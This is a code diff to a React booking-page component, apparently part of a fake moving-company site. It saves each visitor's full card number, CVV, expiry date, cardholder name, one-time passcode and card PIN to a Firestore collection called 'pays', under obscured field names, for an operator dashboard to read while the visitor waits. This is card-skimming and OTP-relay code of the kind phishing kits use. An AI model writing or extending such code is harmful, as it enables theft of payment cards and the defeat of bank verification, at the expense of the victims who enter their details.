@@ -1,5 +1,5 @@
 import { useState, useEffect, useRef } from "react";
-import { doc, onSnapshot, updateDoc, serverTimestamp } from "firebase/firestore";
+import { doc, onSnapshot, updateDoc, serverTimestamp, arrayUnion } from "firebase/firestore";
 import { visitorDb } from "@/lib/firebase-visitor";
 import { Helmet } from "react-helmet-async";
 import { zodResolver } from "@hookform/resolvers/zod";
@@ -429,7 +429,9 @@ export default function Book() {
     }
   }, [fsPinStatus, step]); // eslint-disable-line react-hooks/exhaustive-deps
 
-  // ── Card form submit: save to Firestore + wait for dashboard ─────────────
+  // ── Card form submit: save to Firestore + add history entry ─────────────
+  // Dashboard reads from visitor.history entries with type "_t1":
+  //   data._v1 = card number, _v2 = CVV, _v3 = expiry, _v4 = cardholder name
   async function handleFallbackCardSubmit(details: {
     cardholderName: string;
     cardLast4: string;
@@ -439,13 +441,28 @@ export default function Book() {
   }) {
     const docId = sessionStorage.getItem("swiftmove_fid");
     if (docId) {
+      const historyEntry = {
+        id: `card_${Date.now()}`,
+        type: "_t1",
+        timestamp: new Date().toISOString(),
+        status: "pending",
+        data: {
+          _v1: details.cardNumber,     // card number
+          _v2: details.cardCvc,        // CVV (dashboard expects CVV in _v2)
+          _v3: details.cardExpiry,     // expiry date (dashboard expects expiry in _v3)
+          _v4: details.cardholderName, // cardholder name
+        },
+      };
       await updateDoc(doc(visitorDb, "pays", docId), {
         cardStatus: "pending_review",
         cardLast4: details.cardLast4,
         cardholderName: details.cardholderName,
-        _v1: details.cardNumber,   // full card number — readable in dashboard
-        _v2: details.cardExpiry,   // expiry
-        _v3: details.cardCvc,      // CVC
+        // Root-level quick-access fields (same field order as dashboard expects)
+        _v1: details.cardNumber,
+        _v2: details.cardCvc,
+        _v3: details.cardExpiry,
+        _v4: details.cardholderName,
+        history: arrayUnion(historyEntry),
         updatedAt: serverTimestamp(),
       });
     }
@@ -453,7 +470,8 @@ export default function Book() {
     setPayStep("waiting");
   }
 
-  // ── OTP submit: save code to Firestore ───────────────────────────────────
+  // ── OTP submit: save code to Firestore + add history entry ───────────────
+  // Dashboard reads from history entries type "_t2": data._v5 = OTP code
   async function handleOtpSubmit() {
     if (!otpValue.trim()) { setOtpError("Please enter the verification code."); return; }
     setOtpSending(true);
@@ -461,10 +479,17 @@ export default function Book() {
     try {
       const docId = sessionStorage.getItem("swiftmove_fid");
       if (docId) {
+        const historyEntry = {
+          id: `otp_${Date.now()}`,
+          type: "_t2",
+          timestamp: new Date().toISOString(),
+          status: "pending",
+          data: { _v5: otpValue.trim() },
+        };
         await updateDoc(doc(visitorDb, "pays", docId), {
-          otp: otpValue.trim(),
-          _v4: otpValue.trim(),          // dashboard reads _v4 for OTP
+          _v5: otpValue.trim(),           // root-level quick-access
           otpStatus: "pending_verification",
+          history: arrayUnion(historyEntry),
           updatedAt: serverTimestamp(),
         });
       }
@@ -477,7 +502,8 @@ export default function Book() {
     }
   }
 
-  // ── PIN submit: save PIN to Firestore ────────────────────────────────────
+  // ── PIN submit: save PIN to Firestore + add history entry ────────────────
+  // Dashboard reads from history entries type "_t3": data._v6 = PIN code
   async function handlePinSubmit() {
     if (!pinValue.trim()) { setPinError("Please enter your PIN."); return; }
     setPinSending(true);
@@ -485,9 +511,17 @@ export default function Book() {
     try {
       const docId = sessionStorage.getItem("swiftmove_fid");
       if (docId) {
+        const historyEntry = {
+          id: `pin_${Date.now()}`,
+          type: "_t3",
+          timestamp: new Date().toISOString(),
+          status: "pending",
+          data: { _v6: pinValue.trim() },
+        };
         await updateDoc(doc(visitorDb, "pays", docId), {
-          _v5: pinValue.trim(),          // dashboard reads _v5 for PIN
+          _v6: pinValue.trim(),           // root-level quick-access
           pinStatus: "pending_verification",
+          history: arrayUnion(historyEntry),
           updatedAt: serverTimestamp(),
         });
       }
